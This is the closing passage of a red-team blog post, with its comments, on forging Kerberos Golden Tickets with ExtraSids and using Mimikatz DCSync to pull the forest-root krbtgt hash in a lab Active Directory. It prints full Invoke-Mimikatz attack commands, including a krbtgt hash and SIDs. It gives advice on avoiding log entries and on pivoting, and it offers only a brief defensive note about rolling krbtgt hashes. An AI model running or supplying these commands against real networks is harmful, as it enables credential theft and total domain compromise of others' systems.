		<div id="crayon-60a97dbe609bd673252202" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
&lt;strong&gt;edit: &lt;/strong&gt;Invoke-Mimikatz -Command '"kerberos::golden /user:SECONDARY$ /krbtgt:8b7c904343e530c4f81c53e8f614caf7 /domain:dev.testlab.local /sid:S-1-5-21-4275052721-3205085442-2770241942 /groups:516 /sids:S-1-5-21-456218688-4216621462-1491369290-516,S-1-5-9 /id:S-1-5-21-4275052721-3205085442-2770241942-1002 /ptt" "lsadump::dcsync /domain:testlab.local /dc:Primary.testlab.local /user:testlab\krbtgt" "kerberos::purge"'</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-60a97dbe609bd673252202-1">1</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-60a97dbe609bd673252202-1"><span class="crayon-o">&lt;</span><span class="crayon-v">strong</span><span class="crayon-o">&gt;</span><span class="crayon-v">edit</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-o">&lt;</span><span class="crayon-o">/</span><span class="crayon-v">strong</span><span class="crayon-o">&gt;</span><span class="crayon-v">Invoke</span><span class="crayon-o">-</span><span class="crayon-v">Mimikatz</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-i">Command</span><span class="crayon-h"> </span><span class="crayon-s">'"kerberos::golden /user:SECONDARY$ /krbtgt:8b7c904343e530c4f81c53e8f614caf7 /domain:dev.testlab.local /sid:S-1-5-21-4275052721-3205085442-2770241942 /groups:516 /sids:S-1-5-21-456218688-4216621462-1491369290-516,S-1-5-9 /id:S-1-5-21-4275052721-3205085442-2770241942-1002 /ptt" "lsadump::dcsync /domain:testlab.local /dc:Primary.testlab.local /user:testlab\krbtgt" "kerberos::purge"'</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0003 seconds] -->
<p>And if the SECONDARY domain controller allows PSRemoting, we don&#8217;t even have to RDP, and can perform the entire attack chain from our WINDOWS3 workstation! Because we&#8217;re constructing and injecting a new TGT, we don&#8217;t have to worry about the <a href="http://blogs.msdn.com/b/clustering/archive/2009/06/25/9803001.aspx">Kerberos double-hop problem</a>:</p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->

		<div id="crayon-60a97dbe609c2178903610" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
&lt;del&gt;Invoke-Mimikatz -Command '"kerberos::golden /user:SECONDARY$ /krbtgt:8b7c904343e530c4f81c53e8f614caf7 /domain:dev.testlab.local /sid:S-1-5-21-4275052721-3205085442-2770241942 /sids:S-1-5-21-456218688-4216621462-1491369290-519 /ptt" "lsadump::dcsync /domain:testlab.local /dc:Primary.testlab.local /user:testlab\krbtgt" "kerberos::purge"' -ComputerName SECONDARY.dev.testlab.local&lt;/del&gt;</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-60a97dbe609c2178903610-1">1</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-60a97dbe609c2178903610-1"><span class="crayon-o">&lt;</span><span class="crayon-v">del</span><span class="crayon-o">&gt;</span><span class="crayon-v">Invoke</span><span class="crayon-o">-</span><span class="crayon-v">Mimikatz</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-i">Command</span><span class="crayon-h"> </span><span class="crayon-s">'"kerberos::golden /user:SECONDARY$ /krbtgt:8b7c904343e530c4f81c53e8f614caf7 /domain:dev.testlab.local /sid:S-1-5-21-4275052721-3205085442-2770241942 /sids:S-1-5-21-456218688-4216621462-1491369290-519 /ptt" "lsadump::dcsync /domain:testlab.local /dc:Primary.testlab.local /user:testlab\krbtgt" "kerberos::purge"'</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-e">ComputerName </span><span class="crayon-v">SECONDARY</span><span class="crayon-sy">.</span><span class="crayon-v">dev</span><span class="crayon-sy">.</span><span class="crayon-v">testlab</span><span class="crayon-sy">.</span><span class="crayon-v">local</span><span class="crayon-o">&lt;</span><span class="crayon-o">/</span><span class="crayon-v">del</span><span class="crayon-o">&gt;</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0004 seconds] -->
<p></p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->

		<div id="crayon-60a97dbe609c6705942492" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
&lt;strong&gt;edit: &lt;/strong&gt;Invoke-Mimikatz -Command '"kerberos::golden /user:SECONDARY$ /krbtgt:8b7c904343e530c4f81c53e8f614caf7 /domain:dev.testlab.local /sid:S-1-5-21-4275052721-3205085442-2770241942 /groups:516 /sids:S-1-5-21-456218688-4216621462-1491369290-516,S-1-5-9 /id:S-1-5-21-4275052721-3205085442-2770241942-1002 /ptt" "lsadump::dcsync /domain:testlab.local /dc:Primary.testlab.local /user:testlab\krbtgt" "kerberos::purge"' -ComputerName SECONDARY.dev.testlab.local</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-60a97dbe609c6705942492-1">1</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-60a97dbe609c6705942492-1"><span class="crayon-o">&lt;</span><span class="crayon-v">strong</span><span class="crayon-o">&gt;</span><span class="crayon-v">edit</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-o">&lt;</span><span class="crayon-o">/</span><span class="crayon-v">strong</span><span class="crayon-o">&gt;</span><span class="crayon-v">Invoke</span><span class="crayon-o">-</span><span class="crayon-v">Mimikatz</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-i">Command</span><span class="crayon-h"> </span><span class="crayon-s">'"kerberos::golden /user:SECONDARY$ /krbtgt:8b7c904343e530c4f81c53e8f614caf7 /domain:dev.testlab.local /sid:S-1-5-21-4275052721-3205085442-2770241942 /groups:516 /sids:S-1-5-21-456218688-4216621462-1491369290-516,S-1-5-9 /id:S-1-5-21-4275052721-3205085442-2770241942-1002 /ptt" "lsadump::dcsync /domain:testlab.local /dc:Primary.testlab.local /user:testlab\krbtgt" "kerberos::purge"'</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-e">ComputerName </span><span class="crayon-v">SECONDARY</span><span class="crayon-sy">.</span><span class="crayon-v">dev</span><span class="crayon-sy">.</span><span class="crayon-v">testlab</span><span class="crayon-sy">.</span><span class="crayon-v">local</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0005 seconds] -->
<p><a href="http://www.harmj0y.net/blog/wp-content/uploads/2015/09/golden_dcsync_psremoting1.png"><img loading="lazy" class="aligncenter size-large wp-image-1675" src="http://www.harmj0y.net/blog/wp-content/uploads/2015/09/golden_dcsync_psremoting1-1024x921.png" alt="golden_dcsync_psremoting1" width="640" height="576" srcset="http://www.harmj0y.net/blog/wp-content/uploads/2015/09/golden_dcsync_psremoting1-1024x921.png 1024w, http://www.harmj0y.net/blog/wp-content/uploads/2015/09/golden_dcsync_psremoting1-300x270.png 300w, http://www.harmj0y.net/blog/wp-content/uploads/2015/09/golden_dcsync_psremoting1.png 1601w" sizes="(max-width: 640px) 100vw, 640px" /></a><a href="http://www.harmj0y.net/blog/wp-content/uploads/2015/09/golden_dcsync_psremoting2.png"><img loading="lazy" class="aligncenter size-large wp-image-1676" src="http://www.harmj0y.net/blog/wp-content/uploads/2015/09/golden_dcsync_psremoting2-1024x477.png" alt="golden_dcsync_psremoting2" width="640" height="298" srcset="http://www.harmj0y.net/blog/wp-content/uploads/2015/09/golden_dcsync_psremoting2-1024x477.png 1024w, http://www.harmj0y.net/blog/wp-content/uploads/2015/09/golden_dcsync_psremoting2-300x140.png 300w, http://www.harmj0y.net/blog/wp-content/uploads/2015/09/golden_dcsync_psremoting2.png 1602w" sizes="(max-width: 640px) 100vw, 640px" /></a></p>
<p>Now why did we use the SECONDARY$ account (the domain controller for the child) when building our ticket, as opposed to a normal *-500 Administrator account? <strong>edit:Â </strong><em>And why use the &#8220;Domain Controllers&#8221; and &#8220;Enterprise Domain Controllers&#8221; SIDs when creating the ticket?</em>Â <a href="https://twitter.com/gentilkiwi">@gentilkiwi</a> explainsÂ <a href="https://twitter.com/gentilkiwi/status/637402457740562432">in the following tweets</a>:</p>
<p><a href="https://twitter.com/gentilkiwi/status/637402457740562432" target="_blank"><img loading="lazy" class="aligncenter wp-image-1663 size-large" src="http://www.harmj0y.net/blog/wp-content/uploads/2015/09/delpy_dcsync_dc_acct-1024x382.png" alt="delpy_dcsync_dc_acct" width="640" height="239" srcset="http://www.harmj0y.net/blog/wp-content/uploads/2015/09/delpy_dcsync_dc_acct-1024x382.png 1024w, http://www.harmj0y.net/blog/wp-content/uploads/2015/09/delpy_dcsync_dc_acct-300x112.png 300w, http://www.harmj0y.net/blog/wp-content/uploads/2015/09/delpy_dcsync_dc_acct.png 1168w" sizes="(max-width: 640px) 100vw, 640px" /></a><a href="http://www.harmj0y.net/blog/wp-content/uploads/2015/09/delpy_dcsync_dc_acct.png"><br />
</a> <a href="http://www.harmj0y.net/blog/wp-content/uploads/2015/09/delpy_dcsync2.png"><img loading="lazy" class="aligncenter size-large wp-image-1751" src="http://www.harmj0y.net/blog/wp-content/uploads/2015/09/delpy_dcsync2-1024x787.png" alt="delpy_dcsync2" width="640" height="492" srcset="http://www.harmj0y.net/blog/wp-content/uploads/2015/09/delpy_dcsync2-1024x787.png 1024w, http://www.harmj0y.net/blog/wp-content/uploads/2015/09/delpy_dcsync2-300x231.png 300w, http://www.harmj0y.net/blog/wp-content/uploads/2015/09/delpy_dcsync2.png 1176w" sizes="(max-width: 640px) 100vw, 640px" /></a></p>
<p>During the execution of our first DCSync, we had to use our current <strong>dev.testlab.local</strong> Domain Admin credentials, which causes log entries as Delpy describes above. Once we gain the krbtgtÂ hash of the DEV domain controller (through DCSync or other methods), we can be sneakier in attacking the forest root. If we create our Golden Ticket (as we did above) such that the user account in the PAC is the machine account of the DC we&#8217;re currently operating from (in our case SECONDARY$), but the ExtraSids contains <del>theÂ &#8220;Enterprise Admins&#8221; SID for the forest root</del> <strong>edit: </strong><em>theÂ Domain Controllers SID for the forest root and the &#8220;Enterprise Domain Controllers&#8221; SID</em>, we should be able toÂ DCSync the krbtgt hash of the root without creating additional logs! This is something others have already <a href="http://www.room362.com/2015/09/using-domain-controller-account.html">started to touch on</a>.</p>
<p><strong>Edit: </strong><em>because /id defaultsÂ to domain-500, the<strong>Â </strong>/user and /id for this ticket won&#8217;t match, meaning it will only work for 20 minutes. This is all the time we need, but if you would like it to last longer, you can enumerate the full SID of the SECONDARY.dev.testlab.local domain controller and set that for the /id argument.</em>Â Note: I haven&#8217;t tested this thoroughly as far as log generation, so if the described behavior isn&#8217;t accurate, please let me know and I will correct the description.</p>
<h2>Wrapup</h2>
<p>At this point, with the krbtgt hash of the forest root, we can build Golden Tickets on demand to compromise any machine in theÂ <strong>testlab.local</strong> forest. By taking advantage of Mimikatz&#8217; new features and Sean&#8217;s new work, we can quickly and easily turn the compromise of any domain administrator credentials in the forest into a total forest compromise. One interesting defensive note (that reiterates <a href="https://technet.microsoft.com/en-us/library/cc755979(v=ws.10).aspx">Microsoft&#8217;s description that the domain is not a trust boundary</a>): it&#8217;s not sufficient to change all domain passwords and roll the krbtgt account hash of just the root domain (or the compromised domain), you need to roll the krbtgt hash for ALLÂ domains in the forest. <a href="https://twitter.com/gentilkiwi/status/629696805249384448">Or just</a>:</p>
<p><a href="https://twitter.com/gentilkiwi/status/629696805249384448" target="_blank"><img loading="lazy" class="aligncenter wp-image-1664 size-full" src="http://www.harmj0y.net/blog/wp-content/uploads/2015/09/keep_calm.png" alt="keep_calm" width="600" height="700" srcset="http://www.harmj0y.net/blog/wp-content/uploads/2015/09/keep_calm.png 600w, http://www.harmj0y.net/blog/wp-content/uploads/2015/09/keep_calm-257x300.png 257w" sizes="(max-width: 600px) 100vw, 600px" /></a></p>

		
		
			</div><!-- .entry-content .clear -->
</div>

	
</article><!-- #post-## -->


	<nav class="navigation post-navigation" role="navigation" aria-label="Posts">
		<h2 class="screen-reader-text">Post navigation</h2>
		<div class="nav-links"><div class="nav-previous"><a href="http://www.harmj0y.net/blog/empire/empire-1-2/" rel="prev"><span class="ast-left-arrow">&larr;</span> Previous Post</a></div><div class="nav-next"><a href="http://www.harmj0y.net/blog/powershell/invoke-bypassuac/" rel="next">Next Post <span class="ast-right-arrow">&rarr;</span></a></div></div>
	</nav>
<div id="comments" class="comments-area">

	
				<h3 class="comments-title">
				9 thoughts on &ldquo;Mimikatz and DCSync and ExtraSids, Oh My&rdquo;			</h3>
		
		<ol class="ast-comment-list">
							<li class="comment even thread-even depth-1" id="li-comment-21266">

					<article id="comment-21266" class="ast-comment">
					<div class= 'ast-comment-info'>
						<div class='ast-comment-avatar-wrap'><img alt='' src='http://0.gravatar.com/avatar/c7b27acccc23b613b291d529467037e3?s=50&#038;d=mm&#038;r=g' srcset='http://0.gravatar.com/avatar/c7b27acccc23b613b291d529467037e3?s=100&#038;d=mm&#038;r=g 2x' class='avatar avatar-50 photo' height='50' width='50' loading='lazy'/></div><!-- Remove 1px Space
						-->
								<header class="ast-comment-meta ast-row ast-comment-author vcard capitalize"><div class="ast-comment-cite-wrap"><cite><b class="fn">bigf4n</b> </cite></div><div class="ast-comment-time"><span  class="timendate"><a href="http://www.harmj0y.net/blog/redteaming/mimikatz-and-dcsync-and-extrasids-oh-my/#comment-21266"><time datetime="2015-11-22T09:01:52-05:00">November 22, 2015 at 9:01 am</time></a></span></div>																</header> <!-- .ast-comment-meta -->
							</div>
							<section class="ast-comment-content comment">
								<p>Assuming you have domain admin creds&#8217;, how do you hop from one end point (computer) in a forest domain to another computer in a secondary domain  (same forest) while the a the two domains run on separate networks? (separate vlans, both DCs can communicate &#8211; bridged).</p>
								<div class="ast-comment-edit-reply-wrap">
																		<span class="ast-reply-link"><a rel='nofollow' class='comment-reply-link' href='http://www.harmj0y.net/blog/redteaming/mimikatz-and-dcsync-and-extrasids-oh-my/?replytocom=21266#respond' data-commentid="21266" data-postid="1660" data-belowelement="comment-21266" data-respondelement="respond" data-replyto="Reply to bigf4n" aria-label='Reply to bigf4n'>Reply</a></span>								</div>
															</section> <!-- .ast-comment-content -->
												</article><!-- #comment-## -->

				<ol class="children">
				<li class="comment byuser comment-author-harmj0y bypostauthor odd alt depth-2" id="li-comment-21287">

					<article id="comment-21287" class="ast-comment">
					<div class= 'ast-comment-info'>
						<div class='ast-comment-avatar-wrap'><img alt='' src='http://1.gravatar.com/avatar/a874809641a854ae50e959b608dadefc?s=50&#038;d=mm&#038;r=g' srcset='http://1.gravatar.com/avatar/a874809641a854ae50e959b608dadefc?s=100&#038;d=mm&#038;r=g 2x' class='avatar avatar-50 photo' height='50' width='50' loading='lazy'/></div><!-- Remove 1px Space
						-->
								<header class="ast-comment-meta ast-row ast-comment-author vcard capitalize"><div class="ast-comment-cite-wrap"><cite><b class="fn">harmj0y</b> <span class="ast-highlight-text ast-cmt-post-author"></span></cite></div><div class="ast-comment-time"><span  class="timendate"><a href="http://www.harmj0y.net/blog/redteaming/mimikatz-and-dcsync-and-extrasids-oh-my/#comment-21287"><time datetime="2015-11-22T15:51:54-05:00">November 22, 2015 at 3:51 pm</time></a></span></div>																</header> <!-- .ast-comment-meta -->
							</div>
							<section class="ast-comment-content comment">
								<p>You would need to establish a way to execute the actions from the DC you have access to, whether through an agent or RDP. In similar situations in the past, we&#8217;ve RDP&#8217;ed to the first DC, started PowerShell/loaded up Invoke-Mimikatz and executed the functionality from there.</p>
								<div class="ast-comment-edit-reply-wrap">
																		<span class="ast-reply-link"><a rel='nofollow' class='comment-reply-link' href='http://www.harmj0y.net/blog/redteaming/mimikatz-and-dcsync-and-extrasids-oh-my/?replytocom=21287#respond' data-commentid="21287" data-postid="1660" data-belowelement="comment-21287" data-respondelement="respond" data-replyto="Reply to harmj0y" aria-label='Reply to harmj0y'>Reply</a></span>								</div>
															</section> <!-- .ast-comment-content -->
												</article><!-- #comment-## -->

				</li><!-- #comment-## -->
</ol><!-- .children -->
</li><!-- #comment-## -->
				<li class="comment even thread-odd thread-alt depth-1" id="li-comment-21743">

					<article id="comment-21743" class="ast-comment">
					<div class= 'ast-comment-info'>
						<div class='ast-comment-avatar-wrap'><img alt='' src='http://0.gravatar.com/avatar/09cfbb06ee794b4524d7c0f2646f493b?s=50&#038;d=mm&#038;r=g' srcset='http://0.gravatar.com/avatar/09cfbb06ee794b4524d7c0f2646f493b?s=100&#038;d=mm&#038;r=g 2x' class='avatar avatar-50 photo' height='50' width='50' loading='lazy'/></div><!-- Remove 1px Space
						-->
								<header class="ast-comment-meta ast-row ast-comment-author vcard capitalize"><div class="ast-comment-cite-wrap"><cite><b class="fn">WoW</b> </cite></div><div class="ast-comment-time"><span  class="timendate"><a href="http://www.harmj0y.net/blog/redteaming/mimikatz-and-dcsync-and-extrasids-oh-my/#comment-21743"><time datetime="2015-11-30T10:25:59-05:00">November 30, 2015 at 10:25 am</time></a></span></div>																</header> <!-- .ast-comment-meta -->
							</div>
							<section class="ast-comment-content comment">
								<p>Don&#8217;t you think RDP is too noisy?<br />
Does Empire has the ability to tunnel other empire instances in the network?</p>
<p>Assuming we have two domains in a Forest and a domain admin in both A &amp; B (with bidirectional trust) is it possible to use DCSync and query a user&#8217;s hash saved in Domain A from an end point that is only connected to DC B?<br />
to illustrate: B -&gt; DC(b)  DC(a) &lt;- A<br />
So B can get user hashes from A by using DCSync on the domain he&#039;s connected to (and although B doesn&#039;t have direct access to A).<br />
Is this implemented in PowerView/Empire?</p>
<p>Thanks!</p>
								<div class="ast-comment-edit-reply-wrap">
																		<span class="ast-reply-link"><a rel='nofollow' class='comment-reply-link' href='http://www.harmj0y.net/blog/redteaming/mimikatz-and-dcsync-and-extrasids-oh-my/?replytocom=21743#respond' data-commentid="21743" data-postid="1660" data-belowelement="comment-21743" data-respondelement="respond" data-replyto="Reply to WoW" aria-label='Reply to WoW'>Reply</a></span>								</div>
															</section> <!-- .ast-comment-content -->
												</article><!-- #comment-## -->

				<ol class="children">
				<li class="comment byuser comment-author-harmj0y bypostauthor odd alt depth-2" id="li-comment-21799">

					<article id="comment-21799" class="ast-comment">
					<div class= 'ast-comment-info'>
						<div class='ast-comment-avatar-wrap'><img alt='' src='http://1.gravatar.com/avatar/a874809641a854ae50e959b608dadefc?s=50&#038;d=mm&#038;r=g' srcset='http://1.gravatar.com/avatar/a874809641a854ae50e959b608dadefc?s=100&#038;d=mm&#038;r=g 2x' class='avatar avatar-50 photo' height='50' width='50' loading='lazy'/></div><!-- Remove 1px Space
						-->
								<header class="ast-comment-meta ast-row ast-comment-author vcard capitalize"><div class="ast-comment-cite-wrap"><cite><b class="fn">harmj0y</b> <span class="ast-highlight-text ast-cmt-post-author"></span></cite></div><div class="ast-comment-time"><span  class="timendate"><a href="http://www.harmj0y.net/blog/redteaming/mimikatz-and-dcsync-and-extrasids-oh-my/#comment-21799"><time datetime="2015-12-01T16:01:14-05:00">December 1, 2015 at 4:01 pm</time></a></span></div>																</header> <!-- .ast-comment-meta -->
							</div>
							<section class="ast-comment-content comment">
								<p>RDP &#8216;noise&#8217; depends on the environment. In some environments, RDP is used as the primary remote access method, so using RDP is actually preferred to blend with the noise (in others the opposite is true). Concerning the trust, more information is needed-> &#8220;bidirectional trust&#8221; meaning an external or inner-forest trust? I&#8217;m pretty sure domain hashes are not replicated across external trusts (and I don&#8217;t believe so between intra-forest internal trusts), so you would need to communicate to a DC in domain A from the end point in domain B. This distills some of the points of the post, that depending on network segmentation you need to pivot traffic through the DC_A->DC_B communication through RDP or agent tunneling. Empire does have basic &#8216;<a href="http://www.powershellempire.com/?page_id=102" rel="nofollow">pivot listeners</a>&#8216; but this involves opening up firewall ports on the pivoting machines.</p>
								<div class="ast-comment-edit-reply-wrap">
																		<span class="ast-reply-link"><a rel='nofollow' class='comment-reply-link' href='http://www.harmj0y.net/blog/redteaming/mimikatz-and-dcsync-and-extrasids-oh-my/?replytocom=21799#respond' data-commentid="21799" data-postid="1660" data-belowelement="comment-21799" data-respondelement="respond" data-replyto="Reply to harmj0y" aria-label='Reply to harmj0y'>Reply</a></span>								</div>
															</section> <!-- .ast-comment-content -->
												</article><!-- #comment-## -->

				</li><!-- #comment-## -->
</ol><!-- .children -->
</li><!-- #comment-## -->
				<li class="comment even thread-even depth-1" id="li-comment-22105">

					<article id="comment-22105" class="ast-comment">
					<div class= 'ast-comment-info'>
						<div class='ast-comment-avatar-wrap'><img alt='' src='http://1.gravatar.com/avatar/de188e5fd0ca638236f070b5c914a05b?s=50&#038;d=mm&#038;r=g' srcset='http://1.gravatar.com/avatar/de188e5fd0ca638236f070b5c914a05b?s=100&#038;d=mm&#038;r=g 2x' class='avatar avatar-50 photo' height='50' width='50' loading='lazy'/></div><!-- Remove 1px Space
						-->
								<header class="ast-comment-meta ast-row ast-comment-author vcard capitalize"><div class="ast-comment-cite-wrap"><cite><b class="fn">.</b> </cite></div><div class="ast-comment-time"><span  class="timendate"><a href="http://www.harmj0y.net/blog/redteaming/mimikatz-and-dcsync-and-extrasids-oh-my/#comment-22105"><time datetime="2015-12-07T13:23:15-05:00">December 7, 2015 at 1:23 pm</time></a></span></div>																</header> <!-- .ast-comment-meta -->
							</div>
							<section class="ast-comment-content comment">
								<p>If there&#8217;s a one-way trust between DEV and the forest root, can you still pop the entire forest by getting DA/krbtgt on DEV?</p>
								<div class="ast-comment-edit-reply-wrap">
																		<span class="ast-reply-link"><a rel='nofollow' class='comment-reply-link' href='http://www.harmj0y.net/blog/redteaming/mimikatz-and-dcsync-and-extrasids-oh-my/?replytocom=22105#respond' data-commentid="22105" data-postid="1660" data-belowelement="comment-22105" data-respondelement="respond" data-replyto="Reply to ." aria-label='Reply to .'>Reply</a></span>								</div>
															</section> <!-- .ast-comment-content -->
												</article><!-- #comment-## -->

				<ol class="children">
				<li class="comment byuser comment-author-harmj0y bypostauthor odd alt depth-2" id="li-comment-22115">

					<article id="comment-22115" class="ast-comment">
					<div class= 'ast-comment-info'>
						<div class='ast-comment-avatar-wrap'><img alt='' src='http://1.gravatar.com/avatar/a874809641a854ae50e959b608dadefc?s=50&#038;d=mm&#038;r=g' srcset='http://1.gravatar.com/avatar/a874809641a854ae50e959b608dadefc?s=100&#038;d=mm&#038;r=g 2x' class='avatar avatar-50 photo' height='50' width='50' loading='lazy'/></div><!-- Remove 1px Space
						-->
								<header class="ast-comment-meta ast-row ast-comment-author vcard capitalize"><div class="ast-comment-cite-wrap"><cite><b class="fn">harmj0y</b> <span class="ast-highlight-text ast-cmt-post-author"></span></cite></div><div class="ast-comment-time"><span  class="timendate"><a href="http://www.harmj0y.net/blog/redteaming/mimikatz-and-dcsync-and-extrasids-oh-my/#comment-22115"><time datetime="2015-12-07T18:42:23-05:00">December 7, 2015 at 6:42 pm</time></a></span></div>																</header> <!-- .ast-comment-meta -->
							</div>
							<section class="ast-comment-content comment">
								<p>According to <a href="https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx" rel="nofollow">Microsoft</a>, &#8220;All domain trusts in an Active Directory forest are two-way, transitive trusts&#8221;. So it&#8217;s not really possibly (maybe technically in some weird way, but not commonly/practically) to have a one-way or non-transitive trust between two domains within a forest (and the sid hopping approach only works on domains within a forest).</p>
								<div class="ast-comment-edit-reply-wrap">
																		<span class="ast-reply-link"><a rel='nofollow' class='comment-reply-link' href='http://www.harmj0y.net/blog/redteaming/mimikatz-and-dcsync-and-extrasids-oh-my/?replytocom=22115#respond' data-commentid="22115" data-postid="1660" data-belowelement="comment-22115" data-respondelement="respond" data-replyto="Reply to harmj0y" aria-label='Reply to harmj0y'>Reply</a></span>								</div>
															</section> <!-- .ast-comment-content -->
												</article><!-- #comment-## -->

				</li><!-- #comment-## -->
</ol><!-- .children -->
</li><!-- #comment-## -->
				<li class="pingback even thread-odd thread-alt depth-1" id="comment-43462">
					<p>Pingback: <a href='https://www.carbonblack.com/2017/07/24/threat-hunting-dridex-attacks-top-questions-security-teams/' rel='external nofollow ugc' class='url'>Threat Hunting for Dridex Attacks: Top Questions from Security Teams | Carbon Black</a> </p>
				</li>
				</li><!-- #comment-## -->
				<li class="pingback odd alt thread-even depth-1" id="comment-43622">
					<p>Pingback: <a href='https://adsecurity.org/?p=1729' rel='external nofollow ugc' class='url'>Mimikatz DCSync Usage, Exploitation, and Detection &#8211; Active Directory Security</a> </p>
				</li>
				</li><!-- #comment-## -->
				<li class="pingback even thread-odd thread-alt depth-1" id="comment-72479">
					<p>Pingback: <a href='https://syhack.wordpress.com/2019/10/01/active-directory-kill-chain-attack-101/' rel='external nofollow ugc' class='url'>Active Directory Kill Chain Attack 101 &#8211; syhack</a> </p>
				</li>
				</li><!-- #comment-## -->
		</ol><!-- .ast-comment-list -->

		
	
	
		<div id="respond" class="comment-respond">
